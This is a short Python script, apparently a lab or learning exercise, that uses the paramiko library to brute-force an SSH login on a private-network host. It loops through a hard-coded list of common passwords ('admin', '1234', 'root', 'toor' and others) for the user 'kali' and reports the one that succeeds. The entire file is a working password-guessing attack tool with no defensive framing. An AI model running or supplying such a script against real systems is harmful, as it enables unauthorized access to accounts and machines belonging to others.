import paramiko


def main():
    ip = "192.168.100.99"
    username = "kali"
    passwords = ["admin", "1234", "kali", "root", "toor"]
    client_policy = paramiko.AutoAddPolicy()
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(client_policy)
    for password in passwords:
        try:
            client.connect(hostname=ip, username=username, password=password, timeout=2)
            print(f"[*] Password found: {password}")
            break
        except:
            print(f"[*] Wrong password: {password}")


if __name__ == "__main__":
    main()
